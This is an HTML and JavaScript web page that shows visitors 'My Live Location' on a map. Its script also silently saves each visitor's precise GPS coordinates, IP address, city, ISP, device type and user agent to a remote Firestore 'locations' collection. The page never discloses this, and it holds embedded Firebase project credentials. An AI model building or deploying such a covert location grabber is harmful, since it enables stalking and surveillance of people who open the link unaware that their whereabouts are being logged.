<!DOCTYPE html>
<html>
<head>

<title>Live Location Tracker</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>

body{
font-family:Arial;
background:#f4f6fb;
margin:0;
}

header{
background:#ff4b5c;
color:white;
padding:15px;
font-size:22px;
text-align:center;
}

.container{
width:90%;
margin:auto;
margin-top:20px;
display:flex;
gap:20px;
}

.info{
width:45%;
background:white;
padding:20px;
border-radius:8px;
box-shadow:0 2px 6px rgba(0,0,0,0.1);
}

.row{
margin-bottom:12px;
border-bottom:1px solid #eee;
padding-bottom:6px;
}

.label{
color:#ff4b5c;
font-weight:bold;
}

#map{
width:55%;
height:400px;
border-radius:8px;
}

#status{
margin-top:10px;
font-size:18px;
text-align:center;
}

</style>

</head>

<body>

<header>📍 My Live Location</header>

<div id="status">Please Wait...</div>

<div class="container">

<div class="info">

<div class="row"><span class="label">Latitude:</span> <span id="lat">...</span></div>
<div class="row"><span class="label">Longitude:</span> <span id="lon">...</span></div>

<div class="row"><span class="label">Country:</span> <span id="country">...</span></div>
<div class="row"><span class="label">City:</span> <span id="city">...</span></div>

<div class="row"><span class="label">IP Address:</span> <span id="ip">...</span></div>
<div class="row"><span class="label">ISP:</span> <span id="isp">...</span></div>

<div class="row"><span class="label">Device:</span> <span id="device">...</span></div>

</div>

<div id="map"></div>

</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.appspot.com",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

var map = L.map('map').setView([23.8103,90.4125],10);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
maxZoom:19
}).addTo(map);

function detectDevice(){

let ua=navigator.userAgent;

if(/mobile/i.test(ua)) return "Mobile";
if(/tablet/i.test(ua)) return "Tablet";

return "Desktop";

}

async function saveLocation(lat, lon){

let ip="unknown"
let city="unknown"
let country="unknown"
let isp="unknown"

try{

const res = await fetch("https://ipapi.co/json/")
const data = await res.json()

ip = data.ip
city = data.city
country = data.country_name
isp = data.org

}catch(e){
console.log("IP API error", e)
}

document.getElementById("ip").innerText = ip
document.getElementById("city").innerText = city
document.getElementById("country").innerText = country
document.getElementById("isp").innerText = isp
document.getElementById("device").innerText = detectDevice()

await addDoc(collection(db,"locations"),{

latitude: lat,
longitude: lon,
time: new Date().toISOString(),

ip: ip,
city: city,
country: country,
isp: isp,

device: detectDevice(),
userAgent: navigator.userAgent

})

}

navigator.geolocation.getCurrentPosition(

function(position){

let lat=position.coords.latitude
let lon=position.coords.longitude

document.getElementById("lat").innerText = lat
document.getElementById("lon").innerText = lon

document.getElementById("status").innerHTML =
"Location Detected"

map.setView([lat,lon],15)

L.marker([lat,lon]).addTo(map)

saveLocation(lat,lon)

},

function(error){

document.getElementById("status").innerHTML =
"Location permission denied"

},

{
enableHighAccuracy:true,
timeout:10000,
maximumAge:0
}

)

</script>

</body>
</html>
